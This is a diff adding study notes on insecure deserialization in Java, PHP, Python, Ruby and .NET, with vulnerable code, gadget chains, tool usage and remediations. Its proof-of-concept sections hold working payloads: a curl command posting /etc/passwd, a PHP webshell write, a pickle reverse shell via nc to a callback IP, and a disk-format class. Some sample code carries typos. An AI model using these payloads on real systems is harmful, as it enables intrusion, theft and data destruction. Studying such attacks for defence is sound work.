@@ -1,0 +1,511 @@
+Deserialization Vulnerabilities and Exploitation
+
+Serialization (marshaling):
+	the process of translating data structures or object state into bytes format that can be stored on disk or database or transmitted over the network
+	Object-> Serialize -> Byte stream
+Deserialization (marshaling):
+	the opposite process: to extract data structure or object from a series of bytes
+	Byte stream-> Unserialize-> Object
+
+--Unsecure deserialization of objects is a potential vulnerability in applications written in object-oriented programming languages that parse serialized(marshalled) byte streams
+
+--Depending of the unserialized object, can result in:
+	Privilege escalation through object properties
+	Arbitrary code execution
+
+
+
+
+
+
+	
+	
+	
+
+
+Affected Languages
+
+Java (Java.io)
+	--Common in Java enterprise and thick-client applications
+	Class Interface: Java.io.Serializable
+	Implements classes:
+		ObjectInputStream()
+		ObjectOutputStream()
+		--classes contain several methods to write/read objects
+		ObjectOutputStream
+			writeObject: The method writeObject is used to write an object to the stream
+			writeUTF: Primitive data write of this String in modified UTF-8 format
+		ObjectInputStream
+			readObject:Read an object from the ObjectInputStream
+				*readObject() is the vulnerable method that leads to deserialization vulnerabilities, it takes serialized data without any blacklisting
+					---ObjectInputStream.readObject()
+				E.g.:
+				class ObjectA implements Serializable{
+					public String name;
+					private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
+						//uses “readObject” method to covert Serializable stream to object again
+						in.defaultReadObject();
+						//take java.io.ObjectInputStream and defaultRead() to read no-static and non-transient of current class and appended file extension to name
+						this.name = this.name+".ser";
+					}
+					//to instantiate class: create object from serializeable class and add name to name attribute and Serialize it to (file|network)
+					//using ObjectOutputStream() to de-serialize it again from stream to object called ObjectInputStream() and use readObject() method after converting to object
+				}
+			readUTF: Reads a String in modified UTF-8 format
+	User.java
+	public class Arbitrary implements Serializable {	# Userclass must implement Serializable to be serializable
+		public int arbProp;
+		public Arb() {
+			this.arbProp = 169;
+		}
+	}
+	serialize.java
+		FileOutputStream baos = new FileOutputStream("file.ser");
+		ObjectOutput oos = new ObjectOutputStream(baos);
+		oos.writeObject(Arbitrary);	# writeObject()will write the serialized Arbitrary object to file.ser
+		oos.close();
+	Serial Object Syntactical Notes:
+		0000000: aced 0005 7372 0004  ....sr..
+									  Arbitrary.
+			-java serialized object header followed by the name of the instantiated class that implement serializeable interface
+		Ljava/lang/String;xp
+		I..arbPropxp..
+	Vulnerable Code Example:
+		String parameterValue = request.getParameter("csrfValue")
+		byte[] csrfBytes = DatatypeConverter.parseBase64Binary(parameterValue);
+		ByteArrayInputStream bis = newByteArrayInputStream(csrfBytes);
+		ObjectInput in = newObjectInputStream(bis);
+		csrfToken = (CSRF)in.readObject();	# readObject()called on user supplied parameter value
+	Example Class Gadget:
+		public class Debugger implements Serializable {
+			public String command = "id";
+			public void execCommand(){	# execCommand() runs command in object’s commandproperty
+				Runtime.getRuntime().exec(this.command);
+			}
+			private void readObject(java.io.ObjectInputStream in) throwsIOException, ClassNotFoundException {
+				this.execCommand();	# readObject()calls execCommand()
+			}
+		}
+	Example PoC:
+		Debugger malObj = newDebugger();
+		malObj.command = "curl 127.0.0.1 -X POST -F file=@/etc/passwd";	# Debugger object created with malicious command property
+		ByteArrayOutputStream bos = newByteArrayOutputStream();
+		ObjectOutput oout = newObjectOutputStream(bos);
+		oout.writeObject(malObj);	# Malicious object serialized
+		byte[] urBytes = bos.toByteArray();
+		String base64Obj = DatatypeConverter.printBase64Binary(urBytes);	# Malicious object encoded
+		System.out.println(base64Obj);
+	More Notes on Gadgets:
+		Supply malicious object, start POP chain from that object’s readObject() method
+	Mitigations/Remediations:
+		Never invoke ObjectInputStream.readObject()on anything that can be directly controlled by a user
+		
+	Additional Notes:
+		RMI's (Remote Method Invocaton) Java protocol is based on serialization, JMX(Java Management Extensions) relies on serialized object being transmitted
+		to achieve successful exploitation the vulnerable library needs to be in the Java ClassPath environment variable and the application needs to trust user input to be deserialized
+	YSOSERIAL?
+		https://github.com/frohoff/ysoserial
+		https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+		Building:
+			mvn clean package -DskipTests
+		Usage:
+			java -jar ysoserial.jar [payload] '[command]'
+	MARSHALSEC
+		https://github.com/frohoff/marshalsec
+		https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf
+		Usage:
+			java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
+	https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+	
+
+
+PHP
+	--also commonly referred to as “Object Injection”
+	Class Interface: builtin
+	Implements classes:
+		serialize()
+		unserialize()
+			Calling "magic methods":
+			__destruct()
+			__wakeup()
+				--both "magic methods" used to form POP chains, analogical to ROP gadget chains in memory corruption
+		
+	Serial Object Syntactical Notes:
+		O:4:"Arbitray":1:
+			--Arbitrary object
+		{s:7:"arbProp";i:666;}
+			--arbitrary property of type string, 7 characters in length, will evaluate to integer type value 666
+	Vulnerable Code Example:
+		$yum_cookie = $_COOKIE["yum"];
+		$yum_cookie_decoded = base64_decode($yum_cookie);
+		$yum = unserialize($yum_cookie_decoded);	# unserialize()called on user supplied cookie
+	Example Class Gadget:
+	classDebugger {
+		public $file_name;
+		public $file_contents;
+		public function write_debug_file($file_name, $file_contents){
+			file_put_contents($file_name, $file_contents);	# 2. User controllable properties passed to file_put_contents()
+		}
+		public function __wakeup(){
+			$this->write_debug_file($this->file_name, $this->file_contents);	# 1. __wakeup()called on unserialize, calls write_debug_file()
+		}
+	}
+	Example PoC:
+		require("./debugger.php");
+		$debugger = newDebugger();
+		$debugger->file_name = "/var/www/html/smell.php";	# user-controllable attribute
+		$debugger->file_contents = '<?php echo system($_POST["poc"]); ?>';	# user-controllable attribute
+		echo(base64_encode(serialize($debugger)));
+	More Notes on Gadgets:
+		Composer can bring multiple classes into an application
+		popular composer libraries with useful gadgets:
+			Arbitrary Write:
+				monolog/monolog (<1.11.0)
+				guzzlehttp/guzzle
+				guzzle/guzzle
+			Arbitrary Delete:
+				swiftmailer/swiftmailer
+	Mitigations/Remediations:
+		Neveruse unserialize()on anything that can be controlled by a user
+		Use JSON methods to encode/decode data:
+			json_encode()
+			json_decode()
+Exploiting Induced Unserialization Through the Use of POP (Property Oriented Programming) Chains
+	with induced unserialization no further operations are performed on the object, data not used for any purpose immediately after unserialization
+	"__wakeup" and "__destruct" magic methods are the only possible starting methods for a POP chain
+	--applications using Compser as library manager which include an autoloader usually allow access to a wide range of classes included in the application
+	
+	
+	
+	https://github.com/s-n-t/phpggc
+		--for generating POP chains, which includes several gadget chains in common libraries (~= ysoserial)
+		---2 opmodes: can either prepend a header to the stub or produce a JPEG/Phar polyglot
+	
+			
+Python
+	Class Interface: pickle
+		pickle.load()
+		pickle.loads()
+	Class Interface: cPickle
+		cPickle.load()
+		cPickle.loads()
+	Implements classes: 
+	
+		Python calls __reduce__() on objects it doesn't know how to pickle
+		attack payload object contents:
+			arbitrary attributes
+			arbitrary __reduce__() method
+	
+	pickle.dumps(arbitraryObject)
+		-pickle.dumps() will return the pickled arbitrary object
+	Pickled Object Syntactical Notes:
+		(i__main__.arbitraryObject.p0
+			-pX denotes property
+		(dp1.S'arbitrary_attribute'.p2.I666.sb
+			-S'name' declares property with string type key 'name'
+			-I666 	 defines preceding property's value as equal to property p2, which is integer type value 666
+	Vulnerable Code Example:
+		def index(req):
+			cookie_name = 'Pref'
+			Pref_cookie = request.COOKIES.get(cookie_name)
+			base64_decoded = urlsafe_base64_decode(Pref_cookie)
+			obj = pickle.loads(base64_decoded)	# pickle.loads()called on decoded user-supplied cookie (“Pref”)
+	Example PoC:
+		class PoC(object):
+			def __reduce__(self):	# Malicious __reduce__() method called on pickle.loads()
+				callback_ip = "10.111.1.11"
+				callback_port = "10101"
+				command = "rm /tmp/hell; mknod /tmp/hell p; nc %s %s < /tmp/hell | /bin/bash > /tmp/hell"% (callback_ip, callback_port)
+				return(os.system, (command,))	# Reverse shell payload via os.system(command)
+
+
+
+Ruby
+	--marshalling/unmarshalling
+	Class Interface: Marshal
+	Implements classes:
+		Marshal.load()
+		Marshal.dump()
+			--will return the serialized object
+	Marshalled Object Syntactical Notes:
+		..o:.Arbitrary.:
+			--instantiated object invoked by name
+		.@arbPropi.
+			--arbProp with integer type value 1
+	Mitigations/Remediations:
+		Never use Marshal.load() on anything that can be controlled by a user
+		Use JSON methods rather than Marshal
+		
+	
+	
+.Net (C#/ASP.Net)
+	Class Interface:
+		XML Serialization - .Net Framework Version 1.0
+		System.Xml.Serialization.XmlSerializer
+			--limited to serializing public types, , which have a constructor taking no arguments and will only serialize the public properties and fields of the type
+			--types it will handle (other than primitives) must be specified during the construction of the XmlSerializerobject,
+			Example Code:
+				public class SerializableClass {
+					public string StringProperty{get;set;}
+				}
+				Serializable Class sc = new SerializableClass();
+				XmlSerializer ser = new XmlSerializer(typeof(SerializableClass));
+				using (FileStream stm = File.OpenWrite("output.xml")) {
+					ser.Serialize(stm, sc);
+				}
+		BinaryFormatter Serialization  - .Net Framework Version 1.0
+		System.Runtime.Serialization.Binary.BinaryFormatter
+			--can serialize any type (including internal or private types) as long as the class is annotated with the special SerializableAttribute
+			Implements Classes:
+				System.Runtime.Serialization.IFormatter
+			Example Code:
+				[Serializable]
+				public class SerializableClass {
+					public iny IntegerProperty { get; set; }
+				}
+				SerializableClass sc = new SerializableClass();
+				BinaryFormatter fmt = new BinaryFormatter();
+				using (FileStream stm = File.OpenWrite("output.stm")) {
+					fmt.Serialize(stm, sc);
+				}
+		DataContractSerializer - .Net Framework Version 3.0
+		System.Runtime.Serialization.DataContractSerializer
+			Implements Classes:
+				--base serializer for the Windows Communication Foundation (WCF) library
+
+			--will only handle explicitly annotated classes
+			Example Code:
+				[DataContract]
+				public class SerializableClass {
+					[DataMember]
+					public string StringProperty { get; set; }
+				}
+				SerializableClass sc = new SerializableClass();
+				DataContractSerializer dc = new DataContractSerializer(typeof(SerializableClass));
+				using (FileStream stm = File.OpenWrite("output.xml")) {
+					dc.WriteObject(stm, sc);
+				}
+			
+		NetDataContractSerializer - .Net Framework Version 3.0
+		System.Runtime.Serialization.NetDataContractSerializer
+			Implements Classes
+				--also introduced via WCF
+			
+			--used to replace DataContractSerializer in WCF endpoints, but capable of serializing the same objects as the BinaryFormatter
+			---ergo has potentially similar security issues to last previous class
+			Example Code:
+				[Serializable]
+				public class SerializableClass {
+					public string StringProperty { get; set; }
+				}
+				SerializableClass sc = new SerializableClass();
+				NetDataContractSerializer dc = new NetDataContractSerializer();
+				using (FileStream stm = File.OpenWrite("output.xml")) {
+					dc.WriteObject(stm, sc);
+				}
+				
+	BinaryFormatter serialization mechanism is effectively built into the framework
+		--SerializableAttribute is exposed as the IsSerializable property of the Type class
+	-likely best target for security issues
+		--Being that it supports the same class types as BinaryFormatter, NetDataContractSerializer can be substituted for analysis
+	Vulnerable Code Example:
+		interface IRunnable {
+			bool Run();
+		}
+		private void btnLoadFile_Click(object sender, EventArgs e) {
+			try {
+				OpenFileDialog dlg = new OpenFileDialog();
+				if (dlg.ShowDialog() == System.Windows.Forms.DialogResult.OK) {
+					BinaryFormatter fmt = new BinaryFormatter();
+					MemoryStream stm = new MemoryStream(File.ReadAllBytes(dlg.FileName));
+					IRunnable run = (IRunnable)fmt.Deserialize(stm);
+					run.Run();
+				}
+			}
+			catch (Exception ex) {
+				MessageBox.Show(ex.ToString());
+			}
+		}
+		-accepts a file from user and deserializes it, getting a specific type in process
+		Potential Issues:
+			Unexpected Types
+				-code expects an object which implements the IRunnable interface
+				-problem being that interface is accessable to general types; therefore many classes can implement it
+			
+				-system types -as opposed to types defined locally in the application- may potentially be used to implement unrelated & arbitrary functionality
+				Example attacker-defined class:
+						(expected to return valid from the deserialization function)
+					[Serializable]
+					class FormatHardDisk : IRunnable {
+						public bool Run()
+						{
+							Process.Start("format.exe", "C:");
+							return true;
+						}
+					}
+				THE MORE GENERIC THE OBJECT THE MORE LIKELY THAT THERE IS A DANGEROUS IMPLEMENTATION
+					--can also lead to a denial of service condition if the returned type does not implement the IRunnable interface and the application does not catch InvalidCastException
+				Remediation:
+					expect a type which cannot be possibly derived from (or cannot be derived outside of) the current runtime assembly
+					-expect ‘sealed’ types and use safe casting (i.e. the ‘is’ or ‘as’ keywords) to ensure the object you get back can be cast to the correct type
+
+			Runtime Checks Bypass
+				Deserialization of objects using the BinaryFormatter circumvent the standard construction mechanisms
+				-may be missed if any internal value is supposed to be checked during init, object then becomes dangerous
+				Vulnerable Code Example:
+					[Serializable]
+					class StartUtility : IRunnable {	// IRunnable, IDeserializationCallback <- Import API to hook runtime exectuion checks
+						string _cmd;
+						public StartUtility(string cmd) {
+							if (cmd != "calc") throw new ArgumentException();
+							_cmd = cmd;				// makes check on cmd, but not _cmd, which enters into runtime execution when deserialized
+						}
+						public bool Run() {			// Instead call: public void OnDeserialization(object sender) {
+							Process.Start(_cmd);	// DoCheck(_cmd); from IDeserializationCallback API to get execution during the process of deserialization
+						}							// this will force the process to re-run runtime checks
+					}
+						-class when deserialized does not check the value of the _cmd field
+						-rendering an attacker able to specify any arbitrary process
+				Remediation:
+					*// show in comments of Vuln Code
+
+			Unmanaged Data References
+				.NET framework interworks managed code with unsafe data access
+				-some types typically used to interact with native code are also serializable
+				--therefore any type which refers to unmanaged resources may become dangerous if allowed to be serialized
+				Vulnerable Code Example:
+					[Serializable]
+					class UnmangedBoolean : IRunnable {		// IRunnable, IDeserializationCallback {
+							// [NonSerialized]	//\/ specify NonSerializedAttribute to prevent default serialization
+						IntPtr _p = Marshal.AllocHGlobal(1);
+						public bool Run() {					// public void OnDeserialization(object sender) {
+							return Marshal.ReadByte(_p) == 0;	// Unmanaged references should not be serialized and must be recreated when deserialized
+						}
+					}
+					-a class which serializes a reference to unmanaged memory
+						--an attacker could set this to an arbitrary value
+				Remediation:
+					See Comments in Vuln Code. //
+					
+			Delegates and Events
+				Delegate type, which acts effectively as a function pointer, is serializable
+					--attacker can point a serialized delegate to any method which matches the method type expected
+				Vulnerable Code Example:
+					[Serializable]
+					class WrapEvent : IRunnable {
+					Delegate _d; // Attacker sets to Process.Start method
+					string _arg;
+					public WrapEvent(Delegate d, string arg) {
+						_d = d;
+						_arg = arg;
+					}
+				public bool Run() { // This will start an arbitrary process
+							return (bool)_d.DynamicInvoke(_arg);
+						}
+					}
+					-code takes a delegate and an argument in its constructor
+						--attack could replace the delegate with one which points to the Process.Start method causing an arbitrary process to be created when Run is called
+				Remediation:
+					DELEGATE SHOULD NOT BE SERIALIZED IF AT ALL POSSIBLE
+					-method information can be checked after the fact using the Delegate class’s Method property
+					Secure Code Example:
+						[Serializable]
+						class WrapEvent : IRunnable {
+							// Don't serialize the event's delegate field
+							[field: NonSerialized]
+							public event EventHandler OnRun;
+							public bool Run() {
+								OnRun(this, new EventArgs());
+								return true;
+							}
+						}
+					special attribute syntax is needed to ensure the event’s delegate field will not get serialized
+				
+			Implicit Functionality
+				-previous examples have deserializing code has call methods on the returned object to be vulnerable
+				--here the deserialization process can be exploited before control is even returned to the application
+				Potential Call Back Mechanisms:
+							(assessed to find classes executing dangerous series of operations during deserialization)
+					Implementing ISerializable interface
+					Annotated methods with OnDeserialized or OnDeserializing attributes
+					Implementing IDeserializationCallback interface
+					Implementing IObjectReference interface
+					Implements a custom Finalize method
+				Remediation:
+					implement a custom SerializationBinder and apply that to the BinaryFormatter instance
+						-to filter out types you do not want the serialization process to create
+						--may limit flexibility of the mechanism and therefore make it less useful
+					Example custom SerelizationBinder remediation:
+						class MySerializationBinder : SerializationBinder {
+							private bool ValidType(Type t) { /* Check that type is expected type */ }
+							public override Type BindToType(string assemblyName, string typeName) {
+								Type t = Assembly.Load(assemblyName).GetType(typeName);
+								if (ValidType(t)) {
+									return t;
+								} else {
+									return null;
+								}
+							}
+						}
+						BinaryFormatter fmt = new BinaryFormatter();
+						fmt.Binder = new MySerializationBinder();
+				
+Exploiting Serialization Callback Mechanisms
+
+	Enumerate all types to list any possible serialization call backs
+static bool HasAttribute(MemberInfo mi, Type attrType) {
+	return mi.GetCustomAttributes(attrType, false).Length > 0;
+}
+static void FindSerializableTypes(Assembly asm) {
+	foreach (Type t in asm.GetTypes()) {
+		if (!t.IsAbstract && !t.IsEnum && t.IsSerializable) {
+			if (typeof(ISerializable).IsAssignableFrom(t)) {
+				Console.WriteLine("ISerializable {0}", t.FullName);
+			}
+			if (typeof(IObjectReference).IsAssignableFrom(t)) {
+				Console.WriteLine("IObjectReference {0}", t.FullName);
+			}
+			if (typeof(IDeserializationCallback).IsAssignableFrom(t)) {
+				Console.WriteLine("IDeserializationCallback {0}", t.FullName);
+			}
+			foreach (MethodInfo m in t.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance)) {
+				if (HasAttribute(m, typeof(OnDeserializingAttribute))) {
+					Console.WriteLine("OnDeserializing {0}", t.FullName);
+				}
+				if (HasAttribute(m, typeof(OnDeserializedAttribute))) {
+					Console.WriteLine("OnDeserialized {0}", t.FullName);
+				}
+				if (m.Name == "Finalize" && m.DeclaringType != typeof(object)) {
+					Console.WriteLine("Finalizable {0}", t.FullName);
+				}
+			}
+		}
+	}
+}
+
+Custom Serialization
+ISerializable interface - provides a complete custom serialization function for an object
+	-specifies GetObjectData method which populates a dict of name-value pairs for serialization
+	-Custom-serialized classes require a constructor to take populated dict to reconstruct original object
+	Example Implementation:
+		[Serializable]
+		class CustomSerializableClass : ISerializable {
+			public string SomeValue;
+				// ISerializable implementation
+			public void GetObjectData(SerializationInfo info, StreamingContext context) {
+				info.AddValue("SomeValue", SomeValue);
+			}
+				// Special constructor
+			protected CustomSerializableClass(SerializationInfo info, StreamingContext context) {
+				SomeValue = info.GetString("SomeValue");
+			}
+		}
+	ISerializable able to change object type when deserialized
+		-class can serialize into a different type for transportation, then reconstruct itself during deserialization 
+		security impact in partial trust code, see: MS12-035
+			--prior to MS12-035 no permissiosn were required to call ISerializable API
+	
+				
+				
+			
+https://github.com/pwntester/ysoserial.net
